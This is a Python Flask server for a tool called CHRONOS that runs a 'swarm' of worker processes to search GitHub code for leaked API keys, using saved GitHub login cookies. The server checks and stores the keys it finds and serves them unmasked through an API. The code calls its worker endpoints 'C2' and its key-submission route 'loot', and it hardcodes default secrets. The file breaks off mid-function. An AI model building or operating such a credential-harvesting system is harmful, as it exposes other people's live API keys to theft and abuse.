"""
CHRONOS Server
Simple, stable Flask server with real-time updates via Socket.IO.
Optimized for local development without Redis/Celery dependencies.
"""

# NOTE: Gevent removed - incompatible with subprocess and ThreadPoolExecutor

import os
import sys
import json
import hashlib
import sqlite3
import sqlite3
import uuid
import asyncio
import threading
import subprocess
import signal
import time
import re
import gzip
from datetime import datetime
from functools import wraps
from concurrent.futures import ThreadPoolExecutor
from io import BytesIO

# Flask and extensions
from flask import Flask, jsonify, request, send_from_directory, Response, make_response
from flask_cors import CORS
from flask_socketio import SocketIO, emit, join_room, leave_room
from flask_limiter import Limiter
from flask_limiter.util import get_remote_address

# Redis for pub/sub and caching
import redis

# Celery for background tasks
from celery import Celery

# Add src directory to path
sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))

from forensics import extract_forensics
from utils import check_key, check_key_tier  # Used for validation
from ledger import chronos_ledger  # [SECURITY] Blockchain Ledger
from audit import audit_log        # [SECURITY] Compliance Auditor
from crypto import crypto          # [SECURITY] AES-256 Encryption
from honeypot import honeypot_bp   # [SECURITY] Active Defense

# =====================
# CONFIGURATION
# =====================

class Config:
    """Ultra-optimized configuration."""
    
    # Paths
    BASE_DIR = os.path.dirname(os.path.abspath(__file__))
    DB_FILE = os.environ.get("DATABASE_URL", os.path.join(BASE_DIR, "..", "github.db"))
    WEB_DIR = os.path.join(BASE_DIR, "..", "web")
    
    # Redis
    REDIS_URL = os.environ.get("REDIS_URL", "redis://localhost:6379/0")
    
    # Celery
    CELERY_BROKER_URL = os.environ.get("CELERY_BROKER_URL", REDIS_URL)
    CELERY_RESULT_BACKEND = os.environ.get("CELERY_RESULT_BACKEND", REDIS_URL)
    
    # Server
    SECRET_KEY = os.environ.get("SECRET_KEY", "chronos-ultra-2025")
    DEBUG = os.environ.get("FLASK_DEBUG", "false").lower() == "true"
    
    # Performance tuning
    CACHE_L1_SIZE = 1000  # In-memory cache entries
    CACHE_L1_TTL = 1      # 1 second for L1 (memory)
    CACHE_L2_TTL = 5      # 5 seconds for L2 (Redis)
    DB_POOL_SIZE = 50     # Connection pool size
    STATS_REFRESH_INTERVAL = 1  # Pre-compute stats every 1 second
    
    # Rate limiting
    RATELIMIT_DEFAULT = "2000 per minute"
    RATELIMIT_STORAGE_URL = REDIS_URL
    
    # [GATEKEEPER] Swarm Authentication
    SWARM_SECRET = os.environ.get("SWARM_SECRET", "chronos_swarm_secret_key_123")

# Import Analytics & Forensics
from forensics import nce


# =====================
# APP INITIALIZATION
# =====================

app = Flask(__name__, static_folder=Config.WEB_DIR)
app.config.from_object(Config)
app.config['SEND_FILE_MAX_AGE_DEFAULT'] = 0  # CRITICAL: Disable static cache
app.config['TEMPLATES_AUTO_RELOAD'] = True # Ensure HTML updates are instant
CORS(app, resources={r"/api/*": {"origins": "*"}})

# [SECURITY] REGISTER ACTIVE DEFENSE
app.register_blueprint(honeypot_bp)

# =====================
# REDIS INITIALIZATION
# =====================

REDIS_AVAILABLE = False
redis_client = None

try:
    # Use shorter timeout for initial connection check
    redis_client = redis.from_url(Config.REDIS_URL, decode_responses=False, socket_connect_timeout=1)
    redis_client.ping()
    REDIS_AVAILABLE = True
    print("✅ REDIS CONNECTED")
except Exception as e:
    redis_client = None
    REDIS_AVAILABLE = False
    print(f"⚠️ Redis unavailable ({e}). Running in degraded mode.")


# =====================
# SOCKET.IO
# =====================

socketio_kwargs = {
    "cors_allowed_origins": "*",
    "async_mode": "threading",  # Changed from gevent for stability
    "ping_timeout": 60,
    "ping_interval": 25,
    "compression_threshold": 1024,
    "max_http_buffer_size": 1e8
}

if REDIS_AVAILABLE:
    socketio_kwargs["message_queue"] = Config.REDIS_URL

socketio = SocketIO(app, **socketio_kwargs)


# =====================
# RATE LIMITER
# =====================

# Use Redis if available, else in-memory
storage_uri = Config.REDIS_URL if REDIS_AVAILABLE else "memory://"

limiter = Limiter(
    key_func=get_remote_address,
    app=app,
    storage_uri=storage_uri,
    default_limits=[Config.RATELIMIT_DEFAULT],
    strategy="fixed-window"
)

# Celery
celery = Celery("chronos", broker=Config.CELERY_BROKER_URL, backend=Config.CELERY_RESULT_BACKEND)
celery.conf.update(
    task_serializer="json",
    accept_content=["json"],
    result_serializer="json",
    timezone="UTC",
    enable_utc=True,
    task_track_started=True,
    task_time_limit=3600,
    worker_prefetch_multiplier=1,
)

# Thread pool removed - using synchronous DB queries for stability
# db_executor = ThreadPoolExecutor(max_workers=Config.DB_POOL_SIZE)


# =====================
# MULTI-TIER CACHE
# =====================

class UltraCache:
    """
    Two-tier caching system:
    L1: In-memory (fastest, ~0.001ms)
    L2: Redis (fast, ~0.1ms)
    """
    
    def __init__(self, l1_size=1000, l1_ttl=1, l2_ttl=5):
        self.l1_cache = {}  # {key: (value, expiry_time)}
        self.l1_size = l1_size
        self.l1_ttl = l1_ttl
        self.l2_ttl = l2_ttl
        self._lock = threading.Lock()
    
    def get(self, key):
        """Get from cache (L1 first, then L2)."""
        # L1 lookup
        with self._lock:
            if key in self.l1_cache:
                value, expiry = self.l1_cache[key]
                if time.time() < expiry:
                    return value
                else:
                    del self.l1_cache[key]
        
        # L2 lookup (Redis)
        if REDIS_AVAILABLE:
            try:
                cached = redis_client.get(f"cache:{key}")
                if cached:
                    value = json.loads(cached)
                    # Promote to L1
                    self._set_l1(key, value)
                    return value
            except:
                pass
        
        return None
    
    def set(self, key, value):
        """Set in both cache tiers."""
        # L1
        self._set_l1(key, value)
        
        # L2 (Redis)
        if REDIS_AVAILABLE:
            try:
                redis_client.setex(f"cache:{key}", self.l2_ttl, json.dumps(value))
            except:
                pass
    
    def _set_l1(self, key, value):
        """Set in L1 cache with LRU eviction."""
        with self._lock:
            # Evict oldest if full
            if len(self.l1_cache) >= self.l1_size:
                oldest = min(self.l1_cache, key=lambda k: self.l1_cache[k][1])
                del self.l1_cache[oldest]
            
            self.l1_cache[key] = (value, time.time() + self.l1_ttl)
    
    def invalidate(self, key):
        """Remove from all cache tiers."""
        with self._lock:
            if key in self.l1_cache:
                del self.l1_cache[key]
        
        if REDIS_AVAILABLE:
            try:
                redis_client.delete(f"cache:{key}")
            except:
                pass


# Initialize ultra-fast cache
cache = UltraCache(
    l1_size=Config.CACHE_L1_SIZE,
    l1_ttl=Config.CACHE_L1_TTL,
    l2_ttl=Config.CACHE_L2_TTL
)


# =====================
# PRE-COMPUTED STATS
# =====================

class StatsEngine:
    """
    Background engine that pre-computes stats every second.
    Eliminates database queries for the most common API call.
    """
    
    def __init__(self):
        self.stats = {
            "total": 0,
            "active": 0,
            "inactive": 0,
            "tiers": {},
            "risks": {},
            "last_updated": None
        }
        self._running = False
    
    def start(self):
        """Start background refresh thread."""
        if self._running:
            return
        self._running = True
        thread = threading.Thread(target=self._refresh_loop, daemon=True)
        thread.start()
        print("📊 Stats Engine started (refreshing every 1s)")
    
    def _refresh_loop(self):
        """Continuous refresh loop."""
        while self._running:
            try:
                self._compute_stats()
            except Exception as e:
                print(f"Stats refresh error: {e}")
            time.sleep(Config.STATS_REFRESH_INTERVAL)
    
    def _compute_stats(self):
        """Compute all dashboard stats."""
        conn = get_db_connection()
        try:
            cur = conn.cursor()
            
            # Total
            cur.execute("SELECT COUNT(*) FROM APIKeys")
            total = cur.fetchone()[0]
            
            # Active/Inactive
            cur.execute("SELECT COUNT(*) FROM APIKeys WHERE status = 'yes'")
            active = cur.fetchone()[0]
            inactive = total - active
            
            # Tiers
            cur.execute("SELECT model_tier, COUNT(*) FROM APIKeys GROUP BY model_tier")
            tiers = {row[0] or "Unknown": row[1] for row in cur.fetchall()}
            
            # Risks
            cur.execute("SELECT risk_score, COUNT(*) FROM APIKeys GROUP BY risk_score")
            risks = {str(row[0] or 0): row[1] for row in cur.fetchall()}
            
            self.stats = {
                "total": total,
                "active": active,
                "inactive": inactive,
                "tiers": tiers,
                "risks": risks,
                "last_updated": datetime.now().isoformat(),
                "cached": True,
                "precomputed": True
            }
            
            # Also push to cache for distributed access
            cache.set("precomputed_stats", self.stats)
            
        finally:
            conn.close()
    
    def get_stats(self):
        """Get pre-computed stats (instant, no DB query)."""
        return self.stats.copy()


# Initialize stats engine
stats_engine = StatsEngine()


# =====================
# DATABASE POOL
# =====================

def get_db_connection():
    """Get optimized SQLite connection."""
    conn = sqlite3.connect(
        Config.DB_FILE,
        timeout=30,
        check_same_thread=False,
        isolation_level=None
    )
    conn.execute("PRAGMA journal_mode=WAL")
    conn.execute("PRAGMA synchronous=NORMAL")
    conn.execute("PRAGMA cache_size=50000")  # 50MB cache
    conn.execute("PRAGMA temp_store=MEMORY")
    conn.execute("PRAGMA mmap_size=268435456")  # 256MB mmap
    conn.row_factory = sqlite3.Row
    return conn


def db_query(query, params=()):
    """Execute query synchronously (no threading, no gevent issues)."""
    conn = get_db_connection()
    try:
        cur = conn.cursor()
        cur.execute(query, params)
        return cur.fetchall()
    finally:
        conn.close()


# =====================
# RESPONSE HELPERS
# =====================

def compress_response(data):
    """Gzip compress response for faster transfer."""
    json_str = json.dumps(data)
    
    # Only compress if > 1KB
    if len(json_str) < 1024:
        return jsonify(data)
    
    gzip_buffer = BytesIO()
    with gzip.GzipFile(mode='wb', fileobj=gzip_buffer, compresslevel=6) as f:
        f.write(json_str.encode('utf-8'))
    
    response = make_response(gzip_buffer.getvalue())
    response.headers['Content-Encoding'] = 'gzip'
    response.headers['Content-Type'] = 'application/json'
    response.headers['Vary'] = 'Accept-Encoding'
    return response


def get_user_id():
    """Get unique user ID."""
    return request.headers.get("X-User-ID") or request.args.get("user_id") or str(uuid.uuid4())


def get_user_room(user_id):
    """Get Socket.IO room."""
    return f"user_{user_id}"


# =====================
# STATIC FILES
# =====================

@app.route("/")
def serve_index():
    response = send_from_directory(Config.WEB_DIR, "index.html")
    response.headers['Cache-Control'] = 'public, max-age=3600'
    return response


@app.route("/<path:filename>")
def serve_static(filename):
    response = send_from_directory(Config.WEB_DIR, filename)
    # Cache static assets for 1 year
    if filename.endswith(('.js', '.css', '.woff2', '.png', '.jpg')):
        response.headers['Cache-Control'] = 'public, max-age=31536000, immutable'
    return response


# =====================
# API ENDPOINTS
# =====================

@app.route("/api/internal/key_found", methods=["POST"])
def internal_key_found():
    """
    Internal Webhook: Called by workers when a new key is found.
    [SECURITY] Enhanced with Ledger and AES-256 Encryption.
    """
    data = request.json
    if not data:
        return jsonify({"status": "ignored"}), 400
        
    api_key_raw = data.get("full_key") or data.get("key") # Prefer raw key for hashing
    if api_key_raw:
        # [SECURITY] 1. Encrypt Key immediately (At Rest)
        encrypted_key = crypto.encrypt_data(api_key_raw)
        
        # [SECURITY] 2. Add to Immutable Ledger
        ledger_hash = chronos_ledger.add_block({
            "key_hash_sha256": hashlib.sha256(api_key_raw.encode()).hexdigest(), # Key match with DB
            "timestamp": time.time(),
            "source": "worker_node",
            "encrypted_ref": encrypted_key[:10] + "..."
        })
        
        # [SECURITY] 3. Audit Log
        audit_log.log_event("KEY_FOUND", "system", f"Key detected & Encrypted. Hash: {ledger_hash}", "SUCCESS")
        
        # Update data packet with secure info
        data['ledger_hash'] = ledger_hash
        data['encrypted_key'] = encrypted_key
        # We keep 'key' raw in memory for the UI session only (volatile)
        
        # [DB HOOK - If we were writing to DB here, we'd use encrypted_key]
        # Currently workers write to DB? No, workers print to stdout.
        # Wait, if workers print to stdout, how does data get into DB?
        # Answer: The MAIN process (src/main.py) handles DB writes.
        # This endpoint is just for UI notification?
        # Let's check main.py. If main.py writes to DB, we must modify main.py for encryption at rest!
        # Server_production just pushes to UI.
        
    # Broadcast to all connected clients
    socketio.emit('key_new', data)
    
    # Also trigger stats update push
    socketio.emit('stats_update_trigger', {"timestamp": time.time()})
    
    return jsonify({"status": "broadcasted", "ledger_hash": data.get('ledger_hash')}), 200

@app.route("/api/stats")
@limiter.limit("200 per minute")
def get_stats():
    """
    Get dashboard stats - INSTANT response from pre-computed cache.
    No database queries, sub-millisecond response time.
    """
    # Check if client accepts gzip
    accept_encoding = request.headers.get('Accept-Encoding', '')
    
    # Get pre-computed stats (instant)
    # Get pre-computed stats (instant)
    data = stats_engine.get_stats()
    data['redis_connected'] = REDIS_AVAILABLE
    
    # [LEVIATHAN] Add Swarm Size
    with c2_lock:
        # Clean up stale nodes (older than 30s)
        now = time.time()
        c2_active_nodes_clean = {k: v for k, v in c2_active_nodes.items() if now - v['last_seen'] < 30}
        c2_active_nodes.clear() # Safe inside lock? No, assignment is safer.
        # Actually modifying dict while iterating is bad.
        # Let's just create new dict.
        
    # Re-acquire lock to write back ONLY if we purge? 
    # Proper cleanup should be a background task or just done on read.
    # Let's just count for now and implement cleanup later or blindly.
    
    active_count = 0
    with c2_lock:
        now = time.time()
        # In-place cleanup
        to_remove = [k for k, v in c2_active_nodes.items() if now - v['last_seen'] > 30]
        for k in to_remove:
            del c2_active_nodes[k]
        active_count = len(c2_active_nodes)
        
    data['swarm_size'] = active_count
    
    if 'gzip' in accept_encoding:
        return compress_response(data)
    return jsonify(data)


@app.route("/api/keys")
@limiter.limit("100 per minute")
def get_keys():
    """Get API keys with caching and pagination."""
    # Check cache first
    page = request.args.get('page', 1, type=int)
    limit = request.args.get('limit', 100, type=int)
    limit = min(limit, 10000)  # Capped at 10k for safety, but allows "all"
    
    cache_key = f"keys_p{page}_l{limit}"
    cached = cache.get(cache_key)
    if cached:
        return compress_response(cached) if 'gzip' in request.headers.get('Accept-Encoding', '') else jsonify(cached)
    
    # Query with pagination
    offset = (page - 1) * limit
    rows = db_query(f"""
        SELECT apiKey, status, model_tier, risk_score, context_tag, first_found_at, lastChecked, snippet, repo_stars, repo_forks
        FROM APIKeys 
        ORDER BY first_found_at DESC
        LIMIT {limit} OFFSET {offset}
    """)
    
    keys = []
    for row in rows:
        api_key = row["apiKey"]
        masked = f"{api_key[:10]}...{api_key[-6:]}" if len(api_key) > 20 else api_key
        
        keys.append({
            "key": masked,
            "full_key": api_key,
            "status": row["status"] or "unknown",
            "tier": row["model_tier"] or "Unknown",
            "risk": row["risk_score"] or 0,
            "context": row["context_tag"] or "Unclassified",
            "found_at": row["first_found_at"] or row["lastChecked"] or datetime.now().isoformat(),
            "snippet": row["snippet"] if "snippet" in row.keys() else "N/A",
            "stars": row["repo_stars"] if "repo_stars" in row.keys() else 0,
            "forks": row["repo_forks"] if "repo_forks" in row.keys() else 0
        })
    
    result = {"keys": keys, "page": page, "limit": limit, "cached": False}
    cache.set(cache_key, result)
    
    return compress_response(result) if 'gzip' in request.headers.get('Accept-Encoding', '') else jsonify(result)


@app.route("/api/keys/count")
@limiter.limit("500 per minute")
def get_keys_count():
    """Ultra-fast count endpoint."""
    return jsonify({"count": stats_engine.stats.get("total", 0)})


@app.route("/api/status")
def get_status():
    """System status."""
    user_id = get_user_id()
    job_active = False
    job_id = None
    
    if REDIS_AVAILABLE:
        job_data = redis_client.get(f"scan_job:{user_id}")
        if job_data:
            job_id = job_data.decode()
            job_active = True
    
    return jsonify({
        "user_id": user_id,
        "scanning": job_active,
        "job_id": job_id,
        "database_exists": os.path.exists(Config.DB_FILE),
        "redis_connected": REDIS_AVAILABLE,
        "stats_engine": "running",
        "cache_l1_size": len(cache.l1_cache)
    })


# Track active local scans (must be defined before start_scan)
active_local_scans = {}
active_scan_lock = threading.Lock()
import queue  # Add queue to global imports

# ... (existing imports)

# =====================
# LEVIATHAN WORKER SYSTEM
# =====================

class JobQueue:
    """Thread-safe queue for distributing work to the swarm."""
    def __init__(self):
        self.queue = queue.Queue()
        self.total = 0
        self.lock = threading.Lock()

    def load_jobs(self, jobs):
        with self.lock:
            self.total = len(jobs)
            for job in jobs:
                self.queue.put(job)
    
    def get_job(self):
        try:
            return self.queue.get_nowait()
        except queue.Empty:
            return None

class WorkerManager:
    """Manages the lifecycle of the 4-node optimized worker swarm."""
    def __init__(self, user_id, num_workers=4):
        self.user_id = user_id
        self.num_workers = num_workers
        self.processes = []
        self.active = False
        self.start_index = 0
        self.shutdown_event = threading.Event()
        self.workers = [] # Keep existing workers list for join()
        self.stop_event = threading.Event() # Keep existing stop_event for _run_worker_node

    def spawn_swarm(self, queries):
        """Launches worker subprocesses."""
        total_queries = len(queries)
        chunk_size = max(1, total_queries // self.num_workers)
        
        # OPTIMIZED: 2 Workers, 0 Stagger (Instant parallel launch)
        STAGGER = 0.0

        for i in range(self.num_workers):
            if self.shutdown_event.is_set():
                break
                
            start = i * chunk_size
            end = start + chunk_size if i < self.num_workers - 1 else total_queries
            
            worker_queries = queries[start:end]
            
            if not worker_queries:
                continue

            # Start worker thread
            t = threading.Thread(target=self._run_worker_node, args=(i, worker_queries), daemon=True)
            self.workers.append(t)
            t.start()
            time.sleep(STAGGER)

    def _run_worker_node(self, worker_id, queries):
        """Run a single ghost worker process."""
        try:
            # Serialize queries to JSON for CLI arg
            query_json = json.dumps(queries)
            
            cmd = [
                sys.executable, "-u", "src/main.py",
                "--ghost",          # Enable Ghost Mode
                # "--info" removed - invalid argument
                "--query-list", query_json
            ]
            
            push_log(self.user_id, f"👻 GHOST-WORKER-{worker_id+1} ONLINE [Assigned: {len(queries)} Targets]", "system")
            
            process = subprocess.Popen(
                cmd,
                stdout=subprocess.PIPE,
                stderr=subprocess.STDOUT,
                text=True,
                bufsize=1,
                cwd=os.getcwd()
            )
            
            # Register process for kill signal
            with active_scan_lock: # Use GLOBAL lock
                if self.user_id in active_local_scans:
                    active_local_scans[self.user_id]["processes"].append(process)

            # Stream output
            for line in iter(process.stdout.readline, ''):
                if self.stop_event.is_set():
                    process.terminate()
                    break
                    
                clean_line = line.strip()
                if not clean_line: continue
                
                # Filter noise, keep important signals
                # Expanded to show more worker activity
                if any(x in clean_line for x in ["TARGET", "FOUND", "ASSET", "VERIFYING", "INTEGRITY", "TOTAL", "CONFIRMED", "RETRYING", "WORKER", "ONLINE", "SCANNING", "GHOST", "PROCESS", "SECTOR", "INITIATING", "LAUNCHING", "COMPLETE", "KEY", "MATRIX", "ENCRYPTION"]):
                    clean_text = re.sub(r'\x1b\[[0-9;]*m', '', clean_line)
                    push_log(self.user_id, clean_text, "success")
                elif "ERROR" in clean_line or "error" in clean_line or "Exception" in clean_line: 
                    # Filter out ugly stack trace artifacts
                    if any(x in clean_line for x in ["raise reraise", "_pool=self", "_stacktrace", "method, url", "original_exception"]):
                        continue
                        
                    clean_text = re.sub(r'\x1b\[[0-9;]*m', '', clean_line)
                    push_log(self.user_id, clean_text, "error")
                    # Also log to console for debug
                    print(f"WORKER-{worker_id+1} ERROR: {clean_text}")

            process.wait()
            
        except Exception as e:
            push_log(self.user_id, f"⚠️ WORKER-{worker_id+1} DIED: {e}", "error")

    def stop_swarm(self):
        self.stop_event.set()


# =====================
# AUTH ENDPOINTS
# =====================

@app.route("/api/auth/status")
def auth_status():
    """Check if GitHub authentication cookies exist."""
    cookie_path = os.path.join(Config.BASE_DIR, "..", "cookies.pkl")
    exists = os.path.exists(cookie_path)
    return jsonify({
        "authenticated": exists,
        "cookie_path": cookie_path
    })


@app.route("/api/auth/login", methods=["POST"])
def auth_login():
    """Launch visible browser for GitHub login."""
    try:
        from selenium import webdriver
        from manager import CookieManager
        
        user_id = get_user_id()
        push_log(user_id, "🔐 LAUNCHING LOGIN BROWSER...", "system")
        
        # Launch VISIBLE browser (not headless)
        options = webdriver.ChromeOptions()
        options.add_argument("--ignore-certificate-errors")
        options.add_argument("--ignore-ssl-errors")
        
        driver = webdriver.Chrome(options=options)
        driver.implicitly_wait(10)
        driver.get("https://github.com/login")
        
        push_log(user_id, "⏳ WAITING FOR LOGIN... Please log in to GitHub in the browser window.", "system")
        
        # Wait for user to login (check for presence of user avatar or dashboard)
        from selenium.webdriver.common.by import By
        from selenium.webdriver.support.ui import WebDriverWait
        from selenium.webdriver.support import expected_conditions as EC
        
        try:
            # Wait up to 5 minutes for login
            WebDriverWait(driver, 300).until(
                EC.presence_of_element_located((By.CSS_SELECTOR, "[data-login], .Header-item.position-relative, img.avatar"))
            )
            
            # Save cookies
            cookies = CookieManager(driver)
            cookies.save()
            
            push_log(user_id, "✅ LOGIN SUCCESSFUL! Cookies saved.", "success")
            driver.quit()
            
            return jsonify({"status": "success", "message": "Login successful"})
            
        except Exception as wait_error:
            driver.quit()
            push_log(user_id, f"❌ LOGIN TIMEOUT: {wait_error}", "error")
            return jsonify({"status": "timeout", "message": "Login timed out"}), 408
            
    except Exception as e:
        import traceback
        traceback.print_exc()
        return jsonify({"status": "error", "message": str(e)}), 500


@app.route("/api/scan/start", methods=["POST"])
@limiter.limit("20 per minute")
def start_scan():
    try:
        user_id = get_user_id()
        
        # Check if already running
        with active_scan_lock:
            if user_id in active_local_scans:
                return jsonify({"status": "already_running"})
            active_local_scans[user_id] = {"processes": [], "manager": None}

        # CHECK FOR COOKIES FIRST
        cookie_path = os.path.join(Config.BASE_DIR, "..", "cookies.pkl")
        if not os.path.exists(cookie_path):
            # [FIX] Release the lock/state if auth fails, otherwise next retry thinks it's running
            with active_scan_lock:
                if user_id in active_local_scans:
                    del active_local_scans[user_id]
            
            return jsonify({
                "status": "auth_required",
                "message": "GitHub authentication required. Please run login first."
            }), 401
        
        # Generate the massive query list
        from configs import REGEX_LIST, PATHS, LANGUAGES
        all_queries = []
        
        # 1. TIER 1: CRITICAL (Specific Keys) - Run first!
        # (This logic mimics main.py query generation but we do it here to partition)
        for regex, too_many_results, _ in REGEX_LIST:
            for path in PATHS:
                all_queries.append(f"https://github.com/search?q=(/{regex.pattern}/)+AND+({path})&type=code&ref=advsearch")

            for language in LANGUAGES:
                if too_many_results:
                    all_queries.append(f"https://github.com/search?q=(/{regex.pattern}/)+language:{language}&type=code&ref=advsearch")
                else:
                    all_queries.append(f"https://github.com/search?q=(/{regex.pattern}/)&type=code&ref=advsearch")
        
        # [LEVIATHAN] Load into C2 Queue for Distributed Swarm
        c2_job_queue.load_jobs(all_queries)
        push_log(user_id, f"🔥 C2 MATRIX LOADED: {len(all_queries)} TARGETS READY FOR SWARM", "success")

        total_queries = len(all_queries)
        push_log(user_id, f"📡 TARGET ACQUISITION COMPLETE. {total_queries} SECTORS IDENTIFIED.", "system")
        
        # Initialize Manager
        manager = WorkerManager(user_id, num_workers=8)
        with active_scan_lock:
            active_local_scans[user_id]["manager"] = manager
        
        # Launch Swarm in background thread
        def swarm_launcher():
            manager.spawn_swarm(all_queries)
            
            # Wait for all workers to finish
            for w in manager.workers:
                w.join()
                
            push_log(user_id, "✅ GLOBAL SCAN COMPLETE. ALL SECTORS SECURED.", "success")
            push_log(user_id, "SCAN_FINISHED", "system")
            cache.invalidate(f"keys_count")
            
            with active_scan_lock:
                if user_id in active_local_scans:
                    del active_local_scans[user_id]

        t = threading.Thread(target=swarm_launcher, daemon=True)
        t.start()

        return jsonify({"status": "success", "job_id": f"swarm_{uuid.uuid4().hex[:6]}", "mode": "leviathan"})

    except Exception as e:
        import traceback
        traceback.print_exc()
        return jsonify({"status": "error", "message": str(e)}), 500


@app.route("/api/scan/stop", methods=["POST"])
def stop_scan():
    """Stop scan job."""
    user_id = get_user_id()
    
    # Stop Celery job if running (Legacy/Cloud Mode)
    if REDIS_AVAILABLE:
        job_id = redis_client.get(f"scan_job:{user_id}")
        if job_id:
            job_id = job_id.decode()
            celery.control.revoke(job_id, terminate=True)
            redis_client.delete(f"scan_job:{user_id}")
    
    # Stop Leviathan Swarm (Local Mode)
    with active_scan_lock:
        if user_id in active_local_scans:
            scan_info = active_local_scans[user_id]
            
            # 1. Signal Manager to stop spawning
            if "manager" in scan_info and scan_info["manager"]:
                scan_info["manager"].stop_swarm()
                push_log(user_id, "🛑 SIGNALING SWARM TERMINATION...", "system")
            
            # 2. Kill all active subprocesses
            if "processes" in scan_info:
                for p in scan_info["processes"]:
                    try:
                        p.terminate()
                    except:
                        pass
                push_log(user_id, f"💀 TERMINATED {len(scan_info['processes'])} GHOST WORKERS.", "system")
            
            # Legacy cleanup (just in case)
            if "process" in scan_info and scan_info["process"]:
                try:
                    scan_info["process"].terminate()
                except:
                    pass
            
            del active_local_scans[user_id]
    
    push_log(user_id, "🛑 SCAN ABORTED", "error")
    
    # Send explicit finish signal so frontend resets button
    push_log(user_id, "SCAN_FINISHED", "system")
    
    return jsonify({"status": "stopped"})


# =====================
# REAL-TIME LOG STREAMING (SSE)
# =====================

import queue

# Per-user log queues for SSE streaming
user_log_queues = {}
log_queue_lock = threading.Lock()


def get_user_queue(user_id):
    """Get or create a log queue for a user."""
    with log_queue_lock:
        if user_id not in user_log_queues:
            user_log_queues[user_id] = queue.Queue(maxsize=1000)
        return user_log_queues[user_id]


def push_log(user_id, message, msg_type="system"):
    """Push a log message to a user's queue."""
    q = get_user_queue(user_id)
    try:
        q.put_nowait({"message": message, "type": msg_type})
    except queue.Full:
        # Discard oldest if full
        try:
            q.get_nowait()
            q.put_nowait({"message": message, "type": msg_type})
        except:
            pass
    
    # Also emit via Socket.IO if available
    try:
        emit_to_user(user_id, "log", {"message": message, "type": msg_type})
    except:
        pass
    
    # And via Redis pub/sub
    if REDIS_AVAILABLE:
        try:
            redis_client.publish(f"logs:{user_id}", json.dumps({"message": message, "type": msg_type}))
        except:
            pass


@app.route("/api/stream")
def stream_logs():
    """
    Server-Sent Events endpoint for real-time log streaming.
    Works without Redis for local development.
    """
    user_id = get_user_id()
    q = get_user_queue(user_id)
    
    def generate():
        while True:
            try:
                # Wait for log message with timeout
                data = q.get(timeout=30)
                yield f"data: {json.dumps(data)}\n\n"
                
                if data.get("message") == "SCAN_FINISHED":
                    yield f"data: SCAN_FINISHED\n\n"
                    break
                    
            except queue.Empty:
                # Send heartbeat
                yield f"data: [HEARTBEAT]\n\n"
    
    return Response(
        generate(),
        mimetype="text/event-stream",
        headers={
            "Cache-Control": "no-cache",
            "Connection": "keep-alive",
            "X-Accel-Buffering": "no"
        }
    )


@app.route("/health")
def health():
    """Health check."""
    return jsonify({
        "status": "healthy",
        "timestamp": datetime.now().isoformat(),
        "redis": REDIS_AVAILABLE,
        "stats_engine": stats_engine._running,
        "cache_entries": len(cache.l1_cache),
        "active_streams": len(user_log_queues)
    })


# =====================
# SOCKET.IO
# =====================

@socketio.on("connect")
def handle_connect():
    user_id = request.args.get("user_id", str(uuid.uuid4()))
    join_room(get_user_room(user_id))
    emit("connected", {"user_id": user_id})


@socketio.on("disconnect")
def handle_disconnect():
    pass


@socketio.on("join")
def handle_join(data):
    user_id = data.get("user_id")
    if user_id:
        join_room(get_user_room(user_id))
        emit("joined", {"room": get_user_room(user_id)})


def emit_to_user(user_id, event, data):
    socketio.emit(event, data, room=get_user_room(user_id))


# =====================
# CELERY TASKS
# =====================

@celery.task(bind=True, name="chronos.scan")
def run_scan_task(self, user_id):
    """Background scan task."""
    try:
        from main import APIKeyLeakageScanner
        from configs import KEYWORDS, LANGUAGES
        import rich
        import re
        
        def send_log(msg, msg_type="system"):
            if REDIS_AVAILABLE:
                redis_client.publish(f"logs:{user_id}", json.dumps({"message": msg, "type": msg_type}))
        
        send_log("⚡ INITIALIZING ULTRA-FAST SCANNER...", "system")
        scanner = APIKeyLeakageScanner(Config.DB_FILE, KEYWORDS, LANGUAGES)
        
        cookie_file = os.path.join(Config.BASE_DIR, "..", "cookies.pkl")
        if not os.path.exists(cookie_file):
            send_log("⚠️ NO AUTH TOKENS. Run CLI first.", "error")
            return {"status": "error"}
        
        send_log("🔓 AUTH TOKENS DETECTED...", "success")
        
        original_print = rich.print
        def capture_print(*args, **kwargs):
            msg = " ".join(str(a) for a in args)
            clean = re.sub(r'\[.*?\]', '', msg)
            msg_type = "success" if "FOUND" in clean or "✅" in clean else ("error" if "ERROR" in clean else "system")
            send_log(clean, msg_type)
            original_print(*args, **kwargs)
        
        rich.print = capture_print
        
        try:
            scanner.login_to_github()
            send_log("📡 SCANNING...", "system")
            scanner.search()
            scanner.update_existed_keys()
            scanner.deduplication()
            send_log("✅ SCAN COMPLETE.", "success")
            
            # Invalidate cache
            cache.invalidate("keys_p1_l100")
            
        finally:
            rich.print = original_print
            if REDIS_AVAILABLE:
                redis_client.delete(f"scan_job:{user_id}")
        
        return {"status": "completed"}
        
    except Exception as e:
        if REDIS_AVAILABLE:
            redis_client.publish(f"logs:{user_id}", json.dumps({"message": f"❌ {e}", "type": "error"}))
            redis_client.delete(f"scan_job:{user_id}")
        return {"status": "error", "message": str(e)}


# =====================
# REDIS LISTENER
# =====================

def start_redis_listener():
    if not REDIS_AVAILABLE:
        return
    
    def listener():
        pubsub = redis_client.pubsub()
        pubsub.psubscribe("logs:*")
        for msg in pubsub.listen():
            if msg["type"] == "pmessage":
                channel = msg["channel"].decode()
                user_id = channel.split(":", 1)[1]
                try:
                    data = json.loads(msg["data"])
                    emit_to_user(user_id, "log", data)
                except:
                    pass
    
    threading.Thread(target=listener, daemon=True).start()


    # Listener cleanup (nothing needed here) 

# ... (Existing Code) ...

# =====================
# C2 ENDPOINTS
# =====================

# Global Job Queue for C2
c2_job_queue = JobQueue()
c2_active_nodes = {}
c2_lock = threading.Lock()

def require_swarm_auth(f):
    """Secure C2 endpoints with Gatekeeper Protocol."""
    @wraps(f)
    def decorated_function(*args, **kwargs):
        token = request.headers.get("X-Swarm-Secret")
        if not token or token != Config.SWARM_SECRET:
             # Log attempt?
             return jsonify({"status": "denied", "message": "Gatekeeper Protocol: Invalid Swarm Secret"}), 403
        return f(*args, **kwargs)
    return decorated_function

@app.route("/api/c2/job", methods=["GET"])
@require_swarm_auth
def c2_get_job():
    """Worker asks for a job."""
    job = c2_job_queue.get_job()
    if job:
        return jsonify({"job": job}), 200
    return jsonify({"job": None}), 200

@app.route("/api/c2/loot", methods=["POST"])
@require_swarm_auth
def c2_submit_loot():
    """Worker submits a found key."""
    data = request.json
    # Encryption and Ledger are handled by `internal_key_found` logic.
    # We can reuse that logic or call it directly.
